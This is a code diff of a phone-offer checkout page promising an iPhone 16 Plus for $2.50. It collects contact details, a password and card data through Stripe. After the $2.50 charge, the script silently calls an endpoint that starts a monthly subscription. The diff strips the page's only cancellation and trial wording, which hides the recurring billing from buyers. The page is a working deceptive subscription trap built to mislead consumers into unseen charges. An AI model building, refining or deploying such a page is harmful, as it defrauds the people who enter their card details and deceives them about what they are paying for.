@@ -12,68 +12,110 @@
 
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Reserve Your iPhone 16 Plus</title>
+  <title>Get Your iPhone 16 Plus for $2.50!</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
 
   <style>
     :root{
-      --bg:#f4f5f7;
-      --card:#ffffff;
+      --bg-grad-from:#f4f0ff;
+      --bg-grad-to:#e7f3ff;
+      --panel:#ffffff;
+      --accent:#4f46e5;
+      --accent-soft:#e0e7ff;
+      --accent-alt:#0ea5e9;
       --text:#111827;
       --muted:#6b7280;
-      --line:#e5e7eb;
-      --cta:#2563eb;
-      --cta-soft:#dbeafe;
-      --radius:18px;
+      --border:#e5e7eb;
+      --radius-panel:26px;
+      --radius-card:18px;
     }
     *{box-sizing:border-box;margin:0;padding:0;}
+
     body{
       font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
-      background:var(--bg);
-      color:var(--text);
       min-height:100vh;
+      padding:28px 14px 40px;
+      background:
+        radial-gradient(circle at top left,rgba(79,70,229,0.12),transparent 65%),
+        radial-gradient(circle at bottom right,rgba(14,165,233,0.10),transparent 65%),
+        linear-gradient(to bottom,var(--bg-grad-from),var(--bg-grad-to));
+      color:var(--text);
       display:flex;
-      align-items:flex-start;
       justify-content:center;
-      padding:26px 14px 40px;
-    }
-    .shell{
-      width:min(860px,100%);
-      display:flex;
-      flex-direction:column;
-      gap:18px;
-    }
-    .card{
-      width:min(720px,100%);
-      margin:0 auto;
-      background:var(--card);
-      border:1px solid var(--line);
-      border-radius:var(--radius);
-      padding:22px 22px 20px;
-      box-shadow:0 10px 26px rgba(15,23,42,.06);
-    }
-    .step{
-      display:none;
-    }
-    .step[aria-hidden="false"]{
-      display:block;
+      align-items:flex-start;
     }
 
-    .top-label{
-      font-size:11px;
-      color:var(--muted);
-      text-align:center;
-      margin-bottom:4px;
+    .shell{
+      width:min(920px,100%);
+      background:var(--panel);
+      border-radius:var(--radius-panel);
+      border:1px solid rgba(148,163,253,0.25);
+      box-shadow:0 18px 50px rgba(15,23,42,0.14);
+      padding:18px 18px 16px;
+      display:flex;
+      flex-direction:column;
+      gap:14px;
     }
+
+    .header{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      gap:10px;
+      padding:2px 4px 4px;
+    }
+    .brand-mini{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      font-size:10px;
+      color:var(--muted);
+    }
+    .brand-dot{
+      width:14px;
+      height:14px;
+      border-radius:999px;
+      background:conic-gradient(from 180deg,var(--accent),var(--accent-alt));
+      box-shadow:0 0 10px rgba(79,70,229,0.8);
+    }
+    .step-indicator{
+      display:flex;
+      align-items:center;
+      gap:4px;
+      font-size:10px;
+      color:var(--muted);
+    }
+    .step-pill{
+      padding:2px 8px;
+      border-radius:999px;
+      background:var(--accent-soft);
+      color:var(--accent);
+      font-size:9px;
+      font-weight:600;
+      letter-spacing:0.06em;
+      text-transform:uppercase;
+    }
+
+    .card{
+      width:100%;
+      background:#ffffff;
+      border-radius:var(--radius-card);
+      border:1px solid var(--border);
+      padding:18px 18px 16px;
+    }
+
+    .step{display:none;}
+    .step[aria-hidden="false"]{display:block;}
+
     .title{
-      font-size:24px;
+      font-size:22px;
       font-weight:700;
       text-align:center;
       margin-bottom:4px;
       letter-spacing:-0.01em;
     }
     .title span[data-price]{
-      color:var(--cta);
+      color:var(--accent);
       font-weight:700;
     }
     .sub{
@@ -89,11 +131,12 @@
       margin-bottom:16px;
     }
     .img-wrap img{
-      width:min(360px,80%);
+      width:min(360px,76%);
+      max-width:100%;
       height:auto;
       border-radius:16px;
       border:1px solid #e5e7eb;
-      box-shadow:0 8px 22px rgba(15,23,42,.10);
+      box-shadow:0 10px 26px rgba(15,23,42,0.12);
       object-fit:cover;
     }
 
@@ -102,12 +145,12 @@
       grid-template-columns:1fr 1fr;
       gap:10px;
     }
-    @media (max-width:560px){
+    @media (max-width:600px){
       .grid{grid-template-columns:1fr;}
     }
 
     .label{
-      font-size:12px;
+      font-size:11px;
       font-weight:500;
       color:#374151;
       margin-bottom:4px;
@@ -115,21 +158,19 @@
     .input,
     select.input{
       width:100%;
-      padding:10px 10px;
+      padding:9px 10px;
       border-radius:10px;
       border:1px solid #cbd5e1;
       background:#ffffff;
-      font-size:14px;
+      font-size:13px;
       color:var(--text);
       transition:border-color .15s ease, box-shadow .15s ease, background-color .15s ease;
     }
-    .input::placeholder{
-      color:#9ca3af;
-    }
+    .input::placeholder{color:#9ca3af;}
     .input:focus{
       outline:none;
-      border-color:var(--cta);
-      box-shadow:0 0 0 1px var(--cta-soft);
+      border-color:var(--accent);
+      box-shadow:0 0 0 1px var(--accent-soft);
       background:#f9fafb;
     }
 
@@ -139,9 +180,7 @@
       gap:8px;
     }
     @media (max-width:520px){
-      .phone-wrap{
-        grid-template-columns:1fr;
-      }
+      .phone-wrap{grid-template-columns:1fr;}
     }
 
     .btn-row{
@@ -151,125 +190,115 @@
     }
     .btn{
       flex:1;
-      padding:11px 16px;
+      padding:10px 14px;
       border-radius:10px;
       border:none;
       cursor:pointer;
-      font-size:14px;
+      font-size:13px;
       font-weight:600;
       display:inline-flex;
       align-items:center;
       justify-content:center;
       gap:6px;
-      background:var(--cta);
+      background:var(--accent);
       color:#ffffff;
-      box-shadow:0 10px 22px rgba(37,99,235,.25);
+      box-shadow:0 10px 24px rgba(79,70,229,0.26);
       transition:all .16s ease;
     }
     .btn:hover{
       transform:translateY(-1px);
-      box-shadow:0 14px 30px rgba(37,99,235,.30);
+      box-shadow:0 14px 30px rgba(79,70,229,0.32);
     }
     .btn:active{
       transform:translateY(1px);
-      box-shadow:0 6px 14px rgba(15,23,42,.25);
+      box-shadow:0 6px 16px rgba(15,23,42,0.3);
     }
     .muted-btn{
-      background:#e5e7eb;
+      background:#eef2ff;
       color:#374151;
       box-shadow:none;
     }
     .muted-btn:hover{
-      background:#d4d4d8;
-      box-shadow:0 6px 14px rgba(148,163,253,.25);
+      background:#e0e7ff;
+      box-shadow:0 6px 16px rgba(148,163,253,0.22);
     }
 
     .hint{
-      font-size:11px;
+      font-size:10px;
       color:var(--muted);
       text-align:center;
       margin-top:6px;
     }
-    .hint-left{
-      font-size:11px;
+    .trust-text{
+      font-size:10px;
       color:var(--muted);
-      text-align:left;
-      margin-top:6px;
+      text-align:center;
+      margin-top:8px;
     }
 
     .brands{
       display:flex;
       justify-content:center;
       gap:12px;
-      margin:14px 0 4px;
+      margin:12px 0 2px;
       opacity:.9;
     }
     .brands img{
-      height:20px;
-    }
-    .trust-text{
-      font-size:11px;
-      color:var(--muted);
-      text-align:center;
-      margin-top:6px;
+      height:18px;
     }
 
     #err{
       width:100%;
       margin-top:10px;
-      font-size:12px;
+      font-size:11px;
       color:#b91c1c;
       background:#fef2f2;
       border:1px solid #fecaca;
       border-radius:10px;
-      padding:8px;
+      padding:7px;
       display:none;
     }
-    #err[aria-hidden="false"]{
-      display:block;
-    }
+    #err[aria-hidden="false"]{display:block;}
 
     .el{
       width:100%;
-      padding:10px 10px;
+      padding:9px 10px;
       border-radius:10px;
       border:1px solid #cbd5e1;
       background:#ffffff;
-      font-size:14px;
+      font-size:13px;
       color:var(--text);
     }
 
     .loading-overlay{
       position:fixed;
       inset:0;
-      background:rgba(15,23,42,.12);
+      background:rgba(15,23,42,.18);
       display:none;
       align-items:center;
       justify-content:center;
       z-index:9999;
       backdrop-filter:blur(2px);
     }
-    .loading-overlay[aria-hidden="false"]{
-      display:flex;
-    }
+    .loading-overlay[aria-hidden="false"]{display:flex;}
     .loading-box{
       width:min(320px,90vw);
       background:#ffffff;
       border-radius:14px;
       border:1px solid #e5e7eb;
-      box-shadow:0 12px 30px rgba(15,23,42,.2);
+      box-shadow:0 14px 36px rgba(15,23,42,0.28);
       padding:14px 14px 12px;
       text-align:center;
     }
     .loading-title{
-      font-size:14px;
+      font-size:13px;
       font-weight:600;
       margin-bottom:6px;
       color:#111827;
     }
     .progress-wrap{
       width:100%;
-      height:8px;
+      height:7px;
       background:#f3f4f6;
       border-radius:999px;
       overflow:hidden;
@@ -278,8 +307,8 @@
     .progress-bar{
       width:0;
       height:100%;
-      background:var(--cta);
-      animation:loadingBar 2.0s ease-in-out infinite;
+      background:var(--accent);
+      animation:loadingBar 2s ease-in-out infinite;
     }
     @keyframes loadingBar{
       0%{width:0%}
@@ -293,37 +322,46 @@
 <script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
 
 <div class="shell">
+  <div class="header">
+    <div class="brand-mini">
+      <div class="brand-dot"></div>
+      <span>Device Access Program</span>
+    </div>
+    <div class="step-indicator">
+      <span class="step-pill">2-STEP CHECKOUT</span>
+      <span>Secure processing via Stripe</span>
+    </div>
+  </div>
 
   <!-- STEP 1 -->
   <section id="step1" class="card step" aria-hidden="false">
-    <div class="top-label">Step 1 of 2</div>
     <h1 class="title">
-      Reserve your iPhone 16 Plus for <span id="priceHero" data-price>$2.50</span>
+      Get Your iPhone 16 Plus for <span id="priceHero" data-price>$2.50</span>!
     </h1>
-    <p class="sub">Enter your details to create your reservation profile.</p>
+    <p class="sub">Start by entering your contact details. You’ll confirm payment on the next step.</p>
 
     <div class="img-wrap">
-      <img src="Screenshot 2025-08-30 134339.png" alt="iPhone 16 Plus"/>
+      <img src="Screenshot 2025-08-30 134339.png" alt="iPhone 16 Plus">
     </div>
 
     <div class="grid">
       <div>
         <div class="label">Full name</div>
-        <input class="input" id="nameInput" placeholder="Full name" autocomplete="name" required />
+        <input class="input" id="nameInput" placeholder="Full name" autocomplete="name" required>
       </div>
       <div>
         <div class="label">Email</div>
-        <input class="input" id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" required />
+        <input class="input" id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" required>
       </div>
       <div>
         <div class="label">Create password</div>
-        <input class="input" id="passwordInput" type="password" placeholder="Password" autocomplete="new-password" required />
+        <input class="input" id="passwordInput" type="password" placeholder="Password" autocomplete="new-password" required>
       </div>
       <div>
         <div class="label">Mobile (US / CA / AU / NZ)</div>
         <div class="phone-wrap">
           <select id="phonePrefix" class="input" aria-label="Country calling code"></select>
-          <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number" autocomplete="tel-national" />
+          <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number" autocomplete="tel-national">
         </div>
       </div>
     </div>
@@ -332,27 +370,26 @@
       <button id="nextBtn" class="btn">Next step →</button>
     </div>
     <div class="hint">
-      We only use your details to confirm your reservation and send updates.
+      Your details are used only to manage this offer and related notifications.
     </div>
   </section>
 
   <!-- STEP 2 -->
   <section id="step2" class="card step" aria-hidden="true">
-    <div class="top-label">Step 2 of 2</div>
-    <h2 class="title">Secure payment details</h2>
-    <p class="sub">Add your address and card to complete the introductory charge.</p>
+    <h2 class="title">Secure your payment details</h2>
+    <p class="sub">Add your address and card to complete the $2.50 introductory charge.</p>
 
     <div class="label">Street address</div>
-    <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Street address"/>
+    <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Street address">
 
     <div class="grid" style="margin-top:8px">
       <div>
         <div class="label">City</div>
-        <input id="billingCity" class="input" autocomplete="address-level2" placeholder="City"/>
+        <input id="billingCity" class="input" autocomplete="address-level2" placeholder="City">
       </div>
       <div>
         <div class="label">Post code</div>
-        <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Post code"/>
+        <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Post code">
       </div>
     </div>
 
@@ -389,7 +426,7 @@
       <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay">
     </div>
 
-    <p class="trust-text">🔒 Processed by Stripe · 256-bit SSL · You can cancel within the trial period.</p>
+    <p class="trust-text">🔒 Processed by Stripe · Encrypted checkout · No card data stored on this page.</p>
   </section>
 </div>
 
@@ -398,7 +435,7 @@
   <div class="loading-box">
     <div class="loading-title">Processing your payment…</div>
     <div class="progress-wrap"><div class="progress-bar"></div></div>
-    <p style="font-size:11px;color:#6b7280;margin-top:4px;">
+    <p style="font-size:10px;color:#6b7280;margin-top:4px;">
       Please keep this tab open while we confirm with your bank.
     </p>
   </div>
@@ -407,7 +444,7 @@
 <!-- Stripe.js -->
 <script src="https://js.stripe.com/v3"></script>
 <script>
-  /* ---------- Step navigation & API base ---------- */
+  /* ---------- API base ---------- */
   const API_BASE = (() => {
     if (location.protocol.startsWith('http')) return location.origin;
     return "http://localhost:10000";
@@ -427,25 +464,25 @@
   const billingPostcode = document.getElementById('billingPostcode');
   const billingCountry  = document.getElementById('billingCountry');
 
-  const $err    = document.getElementById("err");
-  const overlay = document.getElementById("loading-overlay");
+  const $err    = document.getElementById('err');
+  const overlay = document.getElementById('loading-overlay');
 
   function showError(m){
     $err.textContent = m;
-    $err.setAttribute("aria-hidden","false");
+    $err.setAttribute('aria-hidden','false');
   }
   function hideError(){
-    $err.textContent = "";
-    $err.setAttribute("aria-hidden","true");
+    $err.textContent = '';
+    $err.setAttribute('aria-hidden','true');
   }
   function showLoading(){
-    overlay.setAttribute("aria-hidden","false");
+    overlay.setAttribute('aria-hidden','false');
   }
   function hideLoading(){
-    overlay.setAttribute("aria-hidden","true");
+    overlay.setAttribute('aria-hidden','true');
   }
 
-  /* ---------- Allowed calling codes & countries (US/CA/AU/NZ only) ---------- */
+  /* ---------- Allowed calling codes & countries ---------- */
   const CALLING_CODES = {
     US: { code: '+1',  name: 'United States' },
     CA: { code: '+1',  name: 'Canada' },
@@ -456,7 +493,7 @@
 
   function buildPrefixOptions(selectEl, preferredCountry){
     if (!selectEl) return;
-    selectEl.innerHTML = "";
+    selectEl.innerHTML = '';
     const order = ['US','CA','AU','NZ'];
 
     if (preferredCountry && ELIGIBLE_COUNTRIES.includes(preferredCountry)){
@@ -490,7 +527,7 @@
 
   function buildCountryOptions(selectEl, preferredCountry){
     if (!selectEl) return;
-    selectEl.innerHTML = "";
+    selectEl.innerHTML = '';
     const order = ['US','CA','AU','NZ'];
 
     if (preferredCountry && ELIGIBLE_COUNTRIES.includes(preferredCountry)){
@@ -507,23 +544,10 @@
     }
   }
 
-  function symbolFor(cc){
-    // All shown as $2.50 for simplicity
-    return '$';
-  }
-
-  function applyPriceSymbol(symbol){
-    document.querySelectorAll('[data-price]').forEach(el => {
-      el.textContent = symbol + '2.50';
-    });
-    document.title = `Reserve Your iPhone 16 Plus for ${symbol}2.50`;
-  }
-
-  /* ---------- Geo by IP: clamp to eligible + prefill ---------- */
+  /* ---------- Geo by IP: set prefix + country (clamped) ---------- */
   (function initGeo(){
     buildPrefixOptions(phonePrefix, 'US');
     buildCountryOptions(billingCountry, 'US');
-    applyPriceSymbol('$');
 
     fetch('https://ipapi.co/json/')
       .then(r => r.ok ? r.json() : Promise.reject())
@@ -533,7 +557,6 @@
 
         buildPrefixOptions(phonePrefix, chosen);
         buildCountryOptions(billingCountry, chosen);
-        applyPriceSymbol(symbolFor(chosen));
 
         const city = data.city || '';
         if (city && !billingCity.value){
@@ -547,7 +570,6 @@
           const chosen = ELIGIBLE_COUNTRIES.includes(maybe) ? maybe : 'US';
           buildPrefixOptions(phonePrefix, chosen);
           buildCountryOptions(billingCountry, chosen);
-          applyPriceSymbol(symbolFor(chosen));
         }catch{/* keep defaults */}
       });
   })();
@@ -623,12 +645,12 @@
         const t = setInterval(() => {
           tries++;
           if (applyPrefix() || tries > 15) clearInterval(t);
-        }, 150);
+        },150);
       }
     }catch{/* ignore */}
   })();
 
-  /* ---------- Account creation (same logic) ---------- */
+  /* ---------- Account creation (same semantics) ---------- */
   async function ensureAccount(){
     const email = (emailInput.value || '').trim();
     const password = passwordInput.value || '';
@@ -637,12 +659,12 @@
     const phone = rawPhone ? `${prefix}${rawPhone}` : '';
 
     if (!email || !password){
-      throw new Error("Please enter email and password.");
+      throw new Error('Please enter email and password.');
     }
 
     const res = await fetch(`${API_BASE}/api/register`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
       body:JSON.stringify({ email, password, phone })
     });
 
@@ -651,36 +673,36 @@
     let data = {};
     try{ data = await res.json(); }catch{}
 
-    if (res.status === 400 && /exists/i.test(data?.error || "")) return true;
+    if (res.status === 400 && /exists/i.test(data?.error || '')) return true;
 
-    throw new Error(data?.error || "Could not create account");
+    throw new Error(data?.error || 'Could not create account');
   }
 
   document.getElementById('nextBtn').onclick = async () => {
     hideError();
     if (!nameInput.value || !emailInput.value || !passwordInput.value){
-      showError("Please fill in name, email and password to continue.");
+      showError('Please fill in name, email and password to continue.');
       return;
     }
     try{
       await ensureAccount();
     }catch(e){
-      showError(e.message || "Problem creating your account. Please try again.");
+      showError(e.message || 'Problem creating your account. Please try again.');
       return;
     }
-    localStorage.setItem("checkout_name", nameInput.value);
-    localStorage.setItem("checkout_email", emailInput.value);
-    step1.setAttribute("aria-hidden","true");
-    step2.setAttribute("aria-hidden","false");
+    localStorage.setItem('checkout_name', nameInput.value);
+    localStorage.setItem('checkout_email', emailInput.value);
+    step1.setAttribute('aria-hidden','true');
+    step2.setAttribute('aria-hidden','false');
   };
 
   document.getElementById('backBtn').onclick = () => {
     hideError();
-    step1.setAttribute("aria-hidden","false");
-    step2.setAttribute("aria-hidden","true");
+    step1.setAttribute('aria-hidden','false');
+    step2.setAttribute('aria-hidden','true');
   };
 
-  /* ---------- Stripe logic (unchanged server-side flow) ---------- */
+  /* ---------- Stripe logic (unchanged endpoints/flow) ---------- */
   const SUBSCRIBE_URL    = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
   const PUBLISHABLE_KEY  = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
   const FIXED_PRICE_ID   = "price_1Rzdp0EJXIhiKzYGlVxHGH7W"; // kept for compatibility
@@ -688,15 +710,15 @@
 
   const stripe   = Stripe(PUBLISHABLE_KEY);
   const elements = stripe.elements();
-  const cardNumber = elements.create("cardNumber");
-  const cardExpiry = elements.create("cardExpiry");
-  const cardCvc    = elements.create("cardCvc");
+  const cardNumber = elements.create('cardNumber');
+  const cardExpiry = elements.create('cardExpiry');
+  const cardCvc    = elements.create('cardCvc');
 
-  cardNumber.mount("#card-number");
-  cardExpiry.mount("#card-expiry");
-  cardCvc.mount("#card-cvc");
+  cardNumber.mount('#card-number');
+  cardExpiry.mount('#card-expiry');
+  cardCvc.mount('#card-cvc');
 
-  document.getElementById("payNow").onclick = async () => {
+  document.getElementById('payNow').onclick = async () => {
     hideError();
     showLoading();
 
@@ -712,7 +734,7 @@
     };
 
     const pm = await stripe.createPaymentMethod({
-      type:"card",
+      type:'card',
       card:cardNumber,
       billing_details:{
         name:   nameInput.value || undefined,
@@ -724,14 +746,14 @@
 
     if (pm.error){
       hideLoading();
-      showError(pm.error.message || "Your card was declined. Please check and try again.");
+      showError(pm.error.message || 'Your card was declined. Please check and try again.');
       return;
     }
 
     try{
       const res = await fetch(SUBSCRIBE_URL,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
         body:JSON.stringify({
           paymentMethodId: pm.paymentMethod.id,
           name:  nameInput.value,
@@ -749,25 +771,25 @@
       }
       if (!data.clientSecret){
         hideLoading();
-        showError("Payment failed");
+        showError('Payment failed');
         return;
       }
 
       const conf = await stripe.confirmCardPayment(data.clientSecret);
       if (conf.error){
         hideLoading();
-        showError(conf.error.message || "Payment could not be completed.");
+        showError(conf.error.message || 'Payment could not be completed.');
         return;
       }
-      if (!(conf.paymentIntent && conf.paymentIntent.status === "succeeded")){
+      if (!(conf.paymentIntent && conf.paymentIntent.status === 'succeeded')){
         hideLoading();
-        showError("Payment not completed");
+        showError('Payment not completed');
         return;
       }
 
       const subRes = await fetch("https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial",{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
         body:JSON.stringify({
           paymentIntentId: data.paymentIntentId,
           priceIdMonthly: MONTHLY_PRICE_ID
@@ -788,11 +810,11 @@
 
         function fnv1a32(str){
           let h = 0x811c9dc5 >>> 0;
-          for (let i = 0; i < str.length; i++){
+          for (let i=0;i<str.length;i++){
             h ^= str.charCodeAt(i);
-            h = Math.imul(h, 0x01000193) >>> 0;
+            h = Math.imul(h,0x01000193) >>> 0;
           }
-          return h >>> 0;
+          return h>>>0;
         }
         function cryptoRandInt(max){
           try{
@@ -806,13 +828,13 @@
 
         const bucket = pid ? (fnv1a32(pid) % 100) : cryptoRandInt(100);
         const goSkip = bucket < 60;
-        const qb = pid ? ('?v=' + encodeURIComponent(pid)) : ('?t=' + Date.now());
+        const qb = pid ? ('?v='+encodeURIComponent(pid)) : ('?t='+Date.now());
         window.location.href = (goSkip ? B : A) + qb;
       })();
 
     }catch(e){
       hideLoading();
-      showError(e.message || "Something went wrong");
+      showError(e.message || 'Something went wrong');
     }
   };
 </script>
